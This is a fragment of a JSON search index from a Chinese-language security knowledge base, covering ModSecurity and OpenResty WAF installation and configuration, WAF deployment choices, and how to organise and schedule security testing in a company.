\u542f\u52a8\u670d\u52a1 systemctl start httpd.service # mod_security\u914d\u7f6e\u6587\u4ef6 /etc/httpd/conf.d/mod_security.conf # \u89c4\u5219\u76ee\u5f55 /etc/httpd/modsecurity.d/activated_rules # \u5b89\u88c5mod_security\u89c4\u5219 yum -y install mod_security_crs # \u67e5\u770b\u89c4\u5219 # \u6d4b\u8bd5url\uff1ahttp://10.10.10.5/ script # \u67e5\u770b\u65e5\u5fd7 tail -n 1 -f /etc/httpd/logs/error_log # \u67e5\u770b\u6a21\u5757\u65e5\u5fd7 tail -f /var/log/httpd/modsec_audit.log","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/security-defense/modsecurity-waf/#modsecuritywaf-fle","text":"\u5b98\u7f51\u5730\u5740 \u5728\u7ebf\u6d4b\u8bd5\u5730\u5740 \u6d4b\u8bd5\u8d26\u53f7\uff1awaffle-demo \u6d4b\u8bd5\u5bc6\u7801\uff1awaffle-demo","title":"ModSecurity\u63a7\u5236\u53f0waf-fle"},{"location":"application-security/security-defense/modsecurity-waf/#_2","text":"owasp mod_security","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-defense/openresty-waf/","text":"openresty-waf \u5b89\u88c5\u4e0e\u4f7f\u7528 # \u64cd\u4f5c\u7cfb\u7edf\uff1acentos7 # \u89e3\u51b3\u4f9d\u8d56 yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 pcre-devel.x86_64 -y # \u4e0b\u8f7dOpenResty wget https://openresty.org/download/openresty-1.13.6.2.tar.gz # \u5b89\u88c5OpenResty tar -xf openresty-1.13.6.2.tar.gz cd openresty-1.13.6.2 ./configure gmake gmake install # \u542f\u52a8\u670d\u52a1 /usr/local/openresty/nginx/sbin/nginx # \u505c\u6b62\u670d\u52a1 /usr/local/openresty/nginx/sbin/nginx -s quit # \u6d4b\u8bd5OpenResty vim /usr/local/openresty/nginx/conf/nginx.conf location /hello { default_type text/html; content_by_lua_block { ngx.say( hello world ) } } # \u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\u6587\u4ef6 /usr/local/openresty/nginx/sbin/nginx -s reload # \u8bbf\u95ee\u9875\u9762\uff1ahttp://10.10.10.5/hello \u5b9e\u73b0waf # \u4e0b\u8f7dwaf git clone https://github.com/unixhot/waf # \u590d\u5236\u5230\u5bf9\u5e94\u76ee\u5f55 mkdir /usr/local/openresty/nginx/conf/waf cp -r waf/waf/* /usr/local/openresty/nginx/conf/waf # \u521b\u5efawaf\u65e5\u5fd7\u76ee\u5f55 mkdir /tmp/waf-log chmod 777 /tmp/waf-log # \u4fee\u6539waf\u914d\u7f6e\uff0c\u4fee\u6539\u65e5\u5fd7\u76ee\u5f55 vim /usr/local/openresty/nginx/conf/waf/config.lua config_log_dir = /tmp/waf-log \u914d\u7f6ewaf vim /usr/local/openresty/nginx/conf/nginx.conf lua_shared_dict limit 50m; lua_package_path /usr/local/openresty/nginx/conf/waf/?.lua ; init_by_lua_file /usr/local/openresty/nginx/conf/waf/init.lua ; access_by_lua_file /usr/local/openresty/nginx/conf/waf/access.lua ; # \u91cd\u542f\u670d\u52a1 # \u8bbf\u95ee\u6d4b\u8bd5\u9875\u9762\uff1ahttp://10.10.10.5/hello.sql waf\u7684\u8bf4\u660e \u89c4\u5219\u8bf4\u660e waf\u89c4\u5219\u6587\u4ef6\u76ee\u5f55\uff1a/usr/local/openresty/nginx/conf/waf/rule-config \u89c4\u5219\u6587\u4ef6\u8bf4\u660e\uff1a\u53ef\u4ee5\u5728\u76f8\u5e94\u7684\u89c4\u5219\u4e2d\u6dfb\u52a0\u5bf9\u5e94\u7684\u503c args.rule\uff1a\u53c2\u6570\u503c\u89c4\u5219 blackip.rule\uff1a\u9ed1\u540d\u5355IP cookie.rule\uff1aCookie\u503c\u89c4\u5219 post.rule\uff1aPost\u6570\u636e\u89c4\u5219 url.rule\uff1aURL\u89c4\u5219 useragent.rule\uff1aUser-Agent\u89c4\u5219 whiteip.rule\uff1a\u767d\u540d\u5355IP whiteurl.rule\uff1a\u767d\u540d\u5355URL \u914d\u7f6e\u8bf4\u660e # waf\u7684\u72b6\u6001\uff0con\u4e3a\u5f00\u542f\uff0coff\u4e3a\u5173\u95ed config_waf_enable = on # \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 config_log_dir = /tmp/waf-log # \u89c4\u5219\u6587\u4ef6\u8def\u5f84 config_rule_dir = /usr/local/openresty/nginx/conf/waf/rule-config # \u662f\u5426\u542f\u7528\u767d\u540d\u5355url\u68c0\u6d4b config_white_url_check = on # \u662f\u5426\u542f\u7528\u767d\u540d\u5355ip\u68c0\u6d4b config_white_ip_check = on # \u662f\u5426\u542f\u7528\u9ed1\u540d\u5355ip\u68c0\u6d4b config_black_ip_check = on # \u662f\u5426\u542f\u7528url\u68c0\u6d4b config_url_check = on # \u662f\u5426\u542f\u7528\u53c2\u6570\u68c0\u6d4b config_url_args_check = on # \u662f\u5426\u542f\u7528user-agent\u68c0\u6d4b config_user_agent_check = on # \u662f\u5426\u542f\u7528cookie\u68c0\u6d4b config_cookie_check = on # \u662f\u5426\u542f\u7528cc\u68c0\u6d4b config_cc_check = on # CC\u68c0\u6d4b\u9891\u7387\u8bbe\u7f6e\uff0cnum/time config_cc_rate = 10/60 # \u662f\u5426\u542f\u7528post\u6570\u636e\u68c0\u6d4b config_post_check = on \u6839\u636e\u914d\u7f6e\u53ef\u5f97\uff0cwaf\u89c4\u5219\u7684\u4f18\u5148\u7ea7\u4e3a\uff1a\u767d\u540d\u5355--\u9ed1\u540d\u5355--\u89c4\u5219\u68c0\u6d4b\uff08allow deny\uff09 \u53c2\u8003\u8d44\u6599 \u5176\u5b83\u5f00\u6e90waf loveshell nginx lua waf jx-sec \u9526\u8863\u76fe","title":"openresty-waf"},{"location":"application-security/security-defense/openresty-waf/#openresty-waf","text":"","title":"openresty-waf"},{"location":"application-security/security-defense/openresty-waf/#_1","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1acentos7 # \u89e3\u51b3\u4f9d\u8d56 yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 pcre-devel.x86_64 -y # \u4e0b\u8f7dOpenResty wget https://openresty.org/download/openresty-1.13.6.2.tar.gz # \u5b89\u88c5OpenResty tar -xf openresty-1.13.6.2.tar.gz cd openresty-1.13.6.2 ./configure gmake gmake install # \u542f\u52a8\u670d\u52a1 /usr/local/openresty/nginx/sbin/nginx # \u505c\u6b62\u670d\u52a1 /usr/local/openresty/nginx/sbin/nginx -s quit # \u6d4b\u8bd5OpenResty vim /usr/local/openresty/nginx/conf/nginx.conf location /hello { default_type text/html; content_by_lua_block { ngx.say( hello world ) } } # \u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\u6587\u4ef6 /usr/local/openresty/nginx/sbin/nginx -s reload # \u8bbf\u95ee\u9875\u9762\uff1ahttp://10.10.10.5/hello","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/security-defense/openresty-waf/#waf","text":"# \u4e0b\u8f7dwaf git clone https://github.com/unixhot/waf # \u590d\u5236\u5230\u5bf9\u5e94\u76ee\u5f55 mkdir /usr/local/openresty/nginx/conf/waf cp -r waf/waf/* /usr/local/openresty/nginx/conf/waf # \u521b\u5efawaf\u65e5\u5fd7\u76ee\u5f55 mkdir /tmp/waf-log chmod 777 /tmp/waf-log # \u4fee\u6539waf\u914d\u7f6e\uff0c\u4fee\u6539\u65e5\u5fd7\u76ee\u5f55 vim /usr/local/openresty/nginx/conf/waf/config.lua config_log_dir = /tmp/waf-log","title":"\u5b9e\u73b0waf"},{"location":"application-security/security-defense/openresty-waf/#waf_1","text":"vim /usr/local/openresty/nginx/conf/nginx.conf lua_shared_dict limit 50m; lua_package_path /usr/local/openresty/nginx/conf/waf/?.lua ; init_by_lua_file /usr/local/openresty/nginx/conf/waf/init.lua ; access_by_lua_file /usr/local/openresty/nginx/conf/waf/access.lua ; # \u91cd\u542f\u670d\u52a1 # \u8bbf\u95ee\u6d4b\u8bd5\u9875\u9762\uff1ahttp://10.10.10.5/hello.sql","title":"\u914d\u7f6ewaf"},{"location":"application-security/security-defense/openresty-waf/#waf_2","text":"","title":"waf\u7684\u8bf4\u660e"},{"location":"application-security/security-defense/openresty-waf/#_2","text":"waf\u89c4\u5219\u6587\u4ef6\u76ee\u5f55\uff1a/usr/local/openresty/nginx/conf/waf/rule-config \u89c4\u5219\u6587\u4ef6\u8bf4\u660e\uff1a\u53ef\u4ee5\u5728\u76f8\u5e94\u7684\u89c4\u5219\u4e2d\u6dfb\u52a0\u5bf9\u5e94\u7684\u503c args.rule\uff1a\u53c2\u6570\u503c\u89c4\u5219 blackip.rule\uff1a\u9ed1\u540d\u5355IP cookie.rule\uff1aCookie\u503c\u89c4\u5219 post.rule\uff1aPost\u6570\u636e\u89c4\u5219 url.rule\uff1aURL\u89c4\u5219 useragent.rule\uff1aUser-Agent\u89c4\u5219 whiteip.rule\uff1a\u767d\u540d\u5355IP whiteurl.rule\uff1a\u767d\u540d\u5355URL","title":"\u89c4\u5219\u8bf4\u660e"},{"location":"application-security/security-defense/openresty-waf/#_3","text":"# waf\u7684\u72b6\u6001\uff0con\u4e3a\u5f00\u542f\uff0coff\u4e3a\u5173\u95ed config_waf_enable = on # \u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 config_log_dir = /tmp/waf-log # \u89c4\u5219\u6587\u4ef6\u8def\u5f84 config_rule_dir = /usr/local/openresty/nginx/conf/waf/rule-config # \u662f\u5426\u542f\u7528\u767d\u540d\u5355url\u68c0\u6d4b config_white_url_check = on # \u662f\u5426\u542f\u7528\u767d\u540d\u5355ip\u68c0\u6d4b config_white_ip_check = on # \u662f\u5426\u542f\u7528\u9ed1\u540d\u5355ip\u68c0\u6d4b config_black_ip_check = on # \u662f\u5426\u542f\u7528url\u68c0\u6d4b config_url_check = on # \u662f\u5426\u542f\u7528\u53c2\u6570\u68c0\u6d4b config_url_args_check = on # \u662f\u5426\u542f\u7528user-agent\u68c0\u6d4b config_user_agent_check = on # \u662f\u5426\u542f\u7528cookie\u68c0\u6d4b config_cookie_check = on # \u662f\u5426\u542f\u7528cc\u68c0\u6d4b config_cc_check = on # CC\u68c0\u6d4b\u9891\u7387\u8bbe\u7f6e\uff0cnum/time config_cc_rate = 10/60 # \u662f\u5426\u542f\u7528post\u6570\u636e\u68c0\u6d4b config_post_check = on \u6839\u636e\u914d\u7f6e\u53ef\u5f97\uff0cwaf\u89c4\u5219\u7684\u4f18\u5148\u7ea7\u4e3a\uff1a\u767d\u540d\u5355--\u9ed1\u540d\u5355--\u89c4\u5219\u68c0\u6d4b\uff08allow deny\uff09","title":"\u914d\u7f6e\u8bf4\u660e"},{"location":"application-security/security-defense/openresty-waf/#_4","text":"","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-defense/openresty-waf/#waf_3","text":"loveshell nginx lua waf jx-sec \u9526\u8863\u76fe","title":"\u5176\u5b83\u5f00\u6e90waf"},{"location":"application-security/security-defense/waf/","text":"Web\u5e94\u7528\u9632\u706b\u5899 waf\u7684\u90e8\u7f72\u65b9\u5f0f \u6839\u636e\u90e8\u7f72\u903b\u8f91 \u4e3b\u8981\u5206\u4e3a\u4e32\u8054\u4e0e\u5e76\u8054\u4e24\u79cd\u5f62\u5f0f\u3002 \u63a8\u8350\u9009\u62e9\uff1a\u7269\u7406\u5e76\u8054\u903b\u8f91\u4e32\u8054\u7684\u90e8\u7f72\u65b9\u5f0f\uff0c\u5bf9\u4e1a\u52a1\u7684\u5f71\u54cd\u8f83\u4f4e\u5e76\u5bb9\u6613\u505a\u964d\u7ea7\u65b9\u6848\u3002 \u6839\u636e\u90e8\u7f72\u65b9\u5f0f cname\u90e8\u7f72\uff08\u4ee3\u7406\u6a21\u5f0f\uff09\u3001module\u90e8\u7f72\uff08\u4e3b\u673a\u6a21\u5f0f\uff09\u3001\u7f51\u7edc\u5c42\u90e8\u7f72\uff08\u7f51\u7edc\u6a21\u5f0f\uff09 \u4f01\u4e1a\u4e0awaf\u65f6\u7684\u601d\u8003 \u5355\u53f0waf\u80fd\u627f\u53d7\u7684QPS\u4e0a\u9650\u662f\u591a\u5c11\uff1f \u90e8\u7f72waf\u5bf9\u7cfb\u7edf\u6027\u80fd\u9020\u6210\u7684\u5f71\u54cd\u662f\u591a\u5c11\uff1f waf\u7684\u8bef\u62a5\u7387\u4e0e\u6f0f\u62a5\u7387\u662f\u5426\u80fd\u8fbe\u5230\u9884\u671f\u7684\u5e73\u8861\u503c\uff08\u5e73\u8861\u503c\uff1a\u4efb\u4f55\u5b89\u5168\u8bbe\u5907\u90fd\u4fdd\u969c\u4e0d\u4e86\u4f4e\u6f0f\u62a5\u3001\u4f4e\u8bef\u62a5\uff0c\u53ea\u80fd\u5728\u8bef\u62a5\u4e0e\u6f0f\u62a5\u4e4b\u95f4\u5747\u8861\uff0c\u8fbe\u5230\u5fc3\u4e2d\u7684\u5e73\u8861\u5c31\u662f\u6700\u597d\u7684\uff09\uff1f \u53c2\u8003\u8d44\u6599 \u4e92\u8054\u7f51\u516c\u53f8WAF\u7cfb\u7edf\u8bbe\u8ba1 \u4f7f\u7528OpenResty\u642d\u5efaWAF\u5e94\u7528 \u4f7f\u7528NGINX+Openresty\u5b9e\u73b0WAF\u529f\u80fd","title":"Web\u5e94\u7528\u9632\u706b\u5899"},{"location":"application-security/security-defense/waf/#web","text":"","title":"Web\u5e94\u7528\u9632\u706b\u5899"},{"location":"application-security/security-defense/waf/#waf","text":"\u6839\u636e\u90e8\u7f72\u903b\u8f91 \u4e3b\u8981\u5206\u4e3a\u4e32\u8054\u4e0e\u5e76\u8054\u4e24\u79cd\u5f62\u5f0f\u3002 \u63a8\u8350\u9009\u62e9\uff1a\u7269\u7406\u5e76\u8054\u903b\u8f91\u4e32\u8054\u7684\u90e8\u7f72\u65b9\u5f0f\uff0c\u5bf9\u4e1a\u52a1\u7684\u5f71\u54cd\u8f83\u4f4e\u5e76\u5bb9\u6613\u505a\u964d\u7ea7\u65b9\u6848\u3002 \u6839\u636e\u90e8\u7f72\u65b9\u5f0f cname\u90e8\u7f72\uff08\u4ee3\u7406\u6a21\u5f0f\uff09\u3001module\u90e8\u7f72\uff08\u4e3b\u673a\u6a21\u5f0f\uff09\u3001\u7f51\u7edc\u5c42\u90e8\u7f72\uff08\u7f51\u7edc\u6a21\u5f0f\uff09","title":"waf\u7684\u90e8\u7f72\u65b9\u5f0f"},{"location":"application-security/security-defense/waf/#waf_1","text":"\u5355\u53f0waf\u80fd\u627f\u53d7\u7684QPS\u4e0a\u9650\u662f\u591a\u5c11\uff1f \u90e8\u7f72waf\u5bf9\u7cfb\u7edf\u6027\u80fd\u9020\u6210\u7684\u5f71\u54cd\u662f\u591a\u5c11\uff1f waf\u7684\u8bef\u62a5\u7387\u4e0e\u6f0f\u62a5\u7387\u662f\u5426\u80fd\u8fbe\u5230\u9884\u671f\u7684\u5e73\u8861\u503c\uff08\u5e73\u8861\u503c\uff1a\u4efb\u4f55\u5b89\u5168\u8bbe\u5907\u90fd\u4fdd\u969c\u4e0d\u4e86\u4f4e\u6f0f\u62a5\u3001\u4f4e\u8bef\u62a5\uff0c\u53ea\u80fd\u5728\u8bef\u62a5\u4e0e\u6f0f\u62a5\u4e4b\u95f4\u5747\u8861\uff0c\u8fbe\u5230\u5fc3\u4e2d\u7684\u5e73\u8861\u5c31\u662f\u6700\u597d\u7684\uff09\uff1f","title":"\u4f01\u4e1a\u4e0awaf\u65f6\u7684\u601d\u8003"},{"location":"application-security/security-defense/waf/#_1","text":"\u4e92\u8054\u7f51\u516c\u53f8WAF\u7cfb\u7edf\u8bbe\u8ba1 \u4f7f\u7528OpenResty\u642d\u5efaWAF\u5e94\u7528 \u4f7f\u7528NGINX+Openresty\u5b9e\u73b0WAF\u529f\u80fd","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/","text":"\u5b89\u5168\u6d4b\u8bd5 \u5b89\u5168\u6d4b\u8bd5\u4e0e\u6e17\u900f\u7684\u533a\u522b \u5b89\u5168\u6d4b\u8bd5\uff1a\u4fa7\u91cd\u4e8e\u5b89\u5168\u5a01\u80c1\u7684\u5efa\u6a21\uff0c\u7cfb\u7edf\u5bf9\u6765\u81ea\u5404\u4e2a\u65b9\u9762\u3001\u5404\u4e2a\u5c42\u9762\u5a01\u80c1\u7684\u5168\u9762\u8003\u91cf\u3002\u4e0d\u5c40\u9650\u4e8eWeb\u5e94\u7528\u7cfb\u7edf\uff0c\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u4f55\u8f6f\u786c\u4ef6\u7cfb\u7edf\u3002 \u6e17\u900f\u6d4b\u8bd5\uff1a\u4fa7\u91cd\u4e8e\u51e0\u4e2a\u70b9\u7684\u7a7f\u900f\u653b\u51fb\uff0c\u4ee5\u9ed1\u5ba2\u653b\u51fb\u624b\u6cd5\u4ece\u5355\u70b9\u627e\u5230\u5229\u7528\u9014\u5f84\uff0c\u8bc1\u660e\u7cfb\u7edf\u5b58\u5728\u95ee\u9898\u3002 \u5b89\u5168\u6d4b\u8bd5\u5206\u7c7b \u767d\u76d2\u6d4b\u8bd5 \u7070\u76d2\u6d4b\u8bd5 \u9ed1\u76d2\u6d4b\u8bd5 \u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b \u5f88\u591a\u4e2d\u5c0f\u578b\u4f01\u4e1a\u662f\u6ca1\u6709\u5408\u7406\u7684\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b\u7684\uff0c\u539f\u56e0\u4e3b\u8981\u6709\u4ee5\u4e0b2\u70b9\uff1a \u5b89\u5168\u4e0e\u4e1a\u52a1\u6c9f\u901a\u534f\u4f5c\u4e0d\u5f53\uff0c\u4e1a\u52a1\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u9700\u8981\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff0c\u5b89\u5168\u5bf9\u4e1a\u52a1\u4e86\u89e3\u592a\u5c11\uff1b \u5b89\u5168\u963b\u788d\u4e86\u4e1a\u52a1\u7684\u53d1\u5c55\uff08\u8fd9\u662f\u5f88\u591a\u4e1a\u52a1\u7684\u76f4\u89c2\u8ba4\u4e3a\uff0c\u4e5f\u662f\u5b89\u5168\u5de5\u4f5c\u4e0d\u5230\u4f4d\u7684\u4f53\u73b0\uff09\uff0c\u5982\uff1a\u5b89\u5168\u6d4b\u8bd5\u6240\u9700\u65f6\u95f4\u3001\u5b89\u5168\u6d4b\u8bd5\u53d1\u73b0\u7684\u95ee\u9898\u9700\u8981\u4fee\u590d\u7b49\u7b49\u8fd9\u4e9b\u90fd\u963b\u788d\u4e86\u7cfb\u7edf\u7684\u9884\u671f\u4e0a\u7ebf\u65f6\u95f4\uff1b \u5f53\u7136\u4e00\u4e2a\u597d\u7684\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b\u9700\u8981\uff1a\u4e0d\u65ad\u7684\u6c9f\u901a\u534f\u8c03\uff0c\u4e00\u4e2a\u5b8c\u5584\u7cfb\u7edf\u5982\uff1a\u90ae\u4ef6(\u6ca1\u6709IT\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b)\u3001JIRA\u3001\u7985\u9053\u7b49\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u5b89\u5168\u6d4b\u8bd52\u79cd\u60c5\u51b5\uff0c\u8fd9\u91cc\u9ed8\u8ba4\u5ffd\u7565\uff1a\u6ca1\u6709\u6d41\u7a0b\uff0c\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u76f4\u63a5\u786c\u6760\u7684\u60c5\u51b5\u3002 \u4e3b\u52a8\u578b\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b \u88ab\u52a8\u578b\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b \u4e24\u79cd\u6d41\u7a0b\u4e3b\u8981\u662f\u63d0\u51fa\u9700\u6c42\u7684\u4eba\u5458\u89d2\u8272\u4e0d\u4e00\u81f4\uff0c\u5728\u63d0\u51fa\u7684\u9700\u6c42\u4e2d\uff0c\u9700\u8981\u660e\u786e\u5982\u4e0b\u7684\u4e1c\u897f\uff1a # \u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u63d0\u51fa\u9700\u6c42\u5ba1\u6279 1.\u9700\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\uff1a\u5730\u5740\u3001\u662f\u5426\u9700\u8981\u4e1a\u52a1\u65b9\u914d\u5408\uff08\u5ba1\u6838\u6ce8\u518c\u7528\u6237\u7b49\uff09\u3001\u662f\u5426\u9700\u8981\u63d0\u4f9b\u6d4b\u8bd5\u8d26\u53f7\u5bc6\u7801\u7b49\u4fe1\u606f\uff1b 2.\u6d4b\u8bd5\u6240\u9700\u7684\u65f6\u95f4\uff1a 3.\u6d4b\u8bd5\u53ef\u80fd\u9020\u6210\u7684\u5f71\u54cd\uff1a 4.\u5b89\u5168\u6d4b\u8bd5\u7528\u4f8b\uff1a\u5982\u679c\u53ef\u80fd\u63d0\u4f9b\u4e00\u4efd\u5b89\u5168\u6d4b\u8bd5\u7528\u4f8b\u8fd9\u6837\u53ef\u4ee5\u8ba9\u4e1a\u52a1\u65b9\u77e5\u6653\u5b89\u5168\u4f1a\u8fdb\u884c\u54ea\u4e9b\u653b\u51fb\uff1b # \u4e1a\u52a1\u65b9\u63d0\u51fa\u5b89\u5168\u6d4b\u8bd5\u9700\u6c42 1.\u9700\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\uff1a\u4e00\u822c\u6211\u9047\u5230\u90fd\u662f\u63a5\u53e3\u6d4b\u8bd5\uff0c\u5c31\u9700\u8981\u63d0\u4f9b\u63a5\u53e3\u6587\u6863\uff1b 2.\u7cfb\u7edf\u4e0a\u7ebf\u65f6\u95f4\uff1a\u5b89\u5168\u6d4b\u8bd5\u9700\u8981\u6839\u636e\u4e0a\u7ebf\u65f6\u95f4\u6765\u5b89\u6392\u6d4b\u8bd5\u65f6\u95f4\uff0c\u4fdd\u969c\u65f6\u95f4\u7684\u5145\u88d5\uff1b \u5b89\u5168\u6d4b\u8bd5\u5468\u671f \u5b89\u5168\u6d4b\u8bd5\u6574\u4f53\u800c\u8a00\u5206\u4e3a\u4e24\u7c7b\uff1a\u5185\u90e8\u5b89\u5168\u56e2\u961f\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\uff08\u5305\u62ec\u4f17\u6d4b\uff09 \u5185\u90e8\u5b89\u5168\u6d4b\u8bd5 \u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff1a\u7ebf\u4e0a\u7cfb\u7edf\u5168\u91cf\u8986\u76d6\u6d4b\u8bd5\uff1b \u4e1a\u52a1\u53d8\u66f4\u5b89\u5168\u6d4b\u8bd5\uff1a\u65b0\u4e1a\u52a1\u3001\u65b0\u7cfb\u7edf\u3001\u4e1a\u52a1\u53d8\u66f4\u7b49\u4e0a\u7ebf\u524d\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u8981\u6c42\u5feb\u901f\u4ea4\u4ed8\uff0c\u4fa7\u91cd\u4e8e\u9ad8\u5371\u3001\u4e25\u91cd\u6f0f\u6d1e\u7684\u6d4b\u8bd5\uff1b \u5916\u90e8\u5b89\u5168\u6d4b\u8bd5 \u91c7\u8d2d\u7b2c\u4e09\u65b9\u5b89\u5168\u670d\u52a1\u6216\u8005\u53c2\u4e0e\u4f17\u6d4b\uff0c\u5177\u4f53\u7684\u65f6\u95f4\u5468\u671f\u9700\u8981\u6839\u636e\u516c\u53f8\u5728\u5b89\u5168\u6d4b\u8bd5\u4e0a\u6240\u6295\u5165\u7684\u8d44\u91d1\u4ee5\u53ca\u5185\u90e8\u5b89\u5168\u56e2\u961f\u60c5\u51b5\u6765\u5408\u7406\u5b89\u6392\u3002\uff08\u6ce8\u610f\u9488\u5bf9\u4e92\u8054\u7f51\u4f01\u4e1a\uff09 \u6ca1\u6709\u5185\u90e8\u5b89\u5168\u56e2\u961f\uff1a\u4e00\u4e2a\u5b63\u5ea6\uff0c\u6216\u8005\u6700\u591a\u534a\u5e74\u5e94\u8be5\u8fdb\u884c\u4e00\u6b21\u5916\u90e8\u7b2c\u4e09\u65b9\u5b89\u5168\u6d4b\u8bd5\uff1b \u6709\u5185\u90e8\u5b89\u5168\u56e2\u961f(\u4eba\u6570\u8f83\u5c11)\uff1a\u534a\u5e74\u6216\u8005\u4e00\u5e74\uff1b \u6210\u719f\u7684\u5185\u90e8\u5b89\u5168\u56e2\u961f\uff1a\u4e00\u5e74\uff0c\u5982\u679c\u5bf9\u56e2\u961f\u6709\u4fe1\u5fc3\uff0c\u5728\u6ca1\u6709\u5408\u89c4\u7b49\u4fdd\u8981\u6c42\u4e0b\u53ef\u4ee5\u4e0d\u505a\uff1b \u5b89\u5168\u6d4b\u8bd5\u7684\u6ce8\u610f\u4e8b\u9879 \u5bf9\u7cfb\u7edf\u9020\u6210\u4e0d\u53ef\u7528\u5f71\u54cd\uff1b\u5982\uff1a\u5bf9server\u7684\u6ea2\u51fa\u64cd\u4f5c\uff0c\u9ad8\u9891\u7387\u722c\u866b\uff1b \u8fdb\u884c\u4e00\u4e9b\u53ef\u80fd\u9020\u6210\u6570\u636e\u4e22\u5931\u6216\u4ea7\u751f\u810f\u6570\u636e\u7684\u6d4b\u8bd5\u5c3d\u53ef\u80fd\u5728\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\uff0c\u6d4b\u8bd5\u73af\u5883\u9700\u8981\u505a\u597d\u5907\u4efd\u65b9\u4fbf\u56de\u6eda\uff1b\u6bd4\u5982\uff1a\u626b\u63cf\u8fc7\u6ee4POST\u8bf7\u6c42\u3002 \u5982\u679c\u6709\u5b89\u5168\u9632\u62a4\u7cfb\u7edf\uff0c\u6d4b\u8bd5\u671f\u95f4\u5c3d\u53ef\u80fd\u5bf9\u5b89\u5168\u6d4b\u8bd5\u8005\u7684IP\u8fdb\u884c\u52a0\u767d\uff0c\u5c0f\u5fc3\u529e\u516c\u7f51\u6d4b\u8bd5\u62c9\u9ed1\u6574\u4e2a\u529e\u516c\u5ba4\u7684\u4eba\u3002 \u6d4b\u8bd5\u4e8b\u540e\u5904\u7406\uff1a\u5b89\u5168\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u9020\u6210\u7684\u6d4b\u8bd5\u6570\u636e\u5220\u9664\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u95ee\u9898\u5b58\u5728\u7684\u540e\u95e8\u5220\u9664\uff1b \u53c2\u8003\u8d44\u6599 \u5b89\u5168\u6d4b\u8bd5\u548c\u6e17\u900f\u6d4b\u8bd5\u533a\u522b \u643a\u7a0b\u5b89\u5168\u81ea\u52a8\u5316\u6d4b\u8bd5\u4e4b\u8def","title":"\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/#_1","text":"","title":"\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/#_2","text":"\u5b89\u5168\u6d4b\u8bd5\uff1a\u4fa7\u91cd\u4e8e\u5b89\u5168\u5a01\u80c1\u7684\u5efa\u6a21\uff0c\u7cfb\u7edf\u5bf9\u6765\u81ea\u5404\u4e2a\u65b9\u9762\u3001\u5404\u4e2a\u5c42\u9762\u5a01\u80c1\u7684\u5168\u9762\u8003\u91cf\u3002\u4e0d\u5c40\u9650\u4e8eWeb\u5e94\u7528\u7cfb\u7edf\uff0c\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u4f55\u8f6f\u786c\u4ef6\u7cfb\u7edf\u3002 \u6e17\u900f\u6d4b\u8bd5\uff1a\u4fa7\u91cd\u4e8e\u51e0\u4e2a\u70b9\u7684\u7a7f\u900f\u653b\u51fb\uff0c\u4ee5\u9ed1\u5ba2\u653b\u51fb\u624b\u6cd5\u4ece\u5355\u70b9\u627e\u5230\u5229\u7528\u9014\u5f84\uff0c\u8bc1\u660e\u7cfb\u7edf\u5b58\u5728\u95ee\u9898\u3002","title":"\u5b89\u5168\u6d4b\u8bd5\u4e0e\u6e17\u900f\u7684\u533a\u522b"},{"location":"application-security/security-testing/#_3","text":"\u767d\u76d2\u6d4b\u8bd5 \u7070\u76d2\u6d4b\u8bd5 \u9ed1\u76d2\u6d4b\u8bd5","title":"\u5b89\u5168\u6d4b\u8bd5\u5206\u7c7b"},{"location":"application-security/security-testing/#_4","text":"\u5f88\u591a\u4e2d\u5c0f\u578b\u4f01\u4e1a\u662f\u6ca1\u6709\u5408\u7406\u7684\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b\u7684\uff0c\u539f\u56e0\u4e3b\u8981\u6709\u4ee5\u4e0b2\u70b9\uff1a \u5b89\u5168\u4e0e\u4e1a\u52a1\u6c9f\u901a\u534f\u4f5c\u4e0d\u5f53\uff0c\u4e1a\u52a1\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u9700\u8981\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff0c\u5b89\u5168\u5bf9\u4e1a\u52a1\u4e86\u89e3\u592a\u5c11\uff1b 